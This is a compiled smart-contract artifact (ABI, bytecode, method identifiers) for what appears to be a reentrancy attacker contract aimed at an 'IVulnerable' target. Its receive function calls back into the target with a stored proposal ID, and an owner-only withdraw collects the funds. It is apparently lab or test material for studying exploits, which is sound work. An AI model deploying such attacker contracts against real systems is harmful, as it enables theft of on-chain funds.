{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"proposalId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"setProposalId","inputs":[{"name":"id","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IVulnerable"}],"stateMutability":"view"},{"type":"function","name":"withdraw","inputs":[{"name":"to","type":"address","internalType":"address payable"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"Received","inputs":[{"name":"sender","type":"address","indexed":false,"internalType":"address"},{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"reenteredAttempted","type":"bool","indexed":false,"internalType":"bool"}],"anonymous":false}],"bytecode":{"object":"0x6080601f61032b38819003918201601f19168301916001600160401b03831184841017608757808492602094604052833981010312608357516001600160a01b038116908190036083575f80546001600160a01b03199081163317909155600180549091169190911790556003805460ff1916905560405161028f908161009c8239f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe60808060405260043610156100ee575b50361561001a575f80fd5b5f60035460ff811615610063575b7f96ecf8026aec664d669dc43d36e6522dba02a60278079154949693632e5d8bce6060836040519033825234602083015215156040820152a1005b60ff1916600190811760035580546002549192506001600160a01b031690813b156100ea575f9160248392604051948593849263ee22610b60e01b845260048401525af180156100df57156100285767ffffffffffffffff81116100cb576040526060610028565b634e487b7160e01b5f52604160045260245ffd5b6040513d5f823e3d90fd5b5f80fd5b5f3560e01c9081632dfca445146102075750806351cff8d9146101ad5780638da5cb5b146101865780639f685caf146101595763d4b8399214610131575f61000f565b346100ea575f3660031901126100ea576001546040516001600160a01b039091168152602090f35b346100ea5760203660031901126100ea5761017e60018060a01b035f54163314610221565b600435600255005b346100ea575f3660031901126100ea575f546040516001600160a01b039091168152602090f35b346100ea5760203660031901126100ea576004356001600160a01b038116908190036100ea575f808080936101ec60018060a01b038354163314610221565b47908282156101fe575bf1156100df57005b506108fc6101f6565b346100ea575f3660031901126100ea576020906002548152f35b1561022857565b60405162461bcd60e51b81526020600482015260096024820152683737ba1037bbb732b960b91b6044820152606490fdfea26469706673582212205c1ef4a3b5dacbae3b86398ad7b0994aabb11311cf5fa6caf9eb4c40969f5a0b64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"owner()":"8da5cb5b","proposalId()":"2dfca445","setProposalId(uint256)":"9f685caf","target()":"d4b83992","withdraw(address)":"51cff8d9"},"id":3}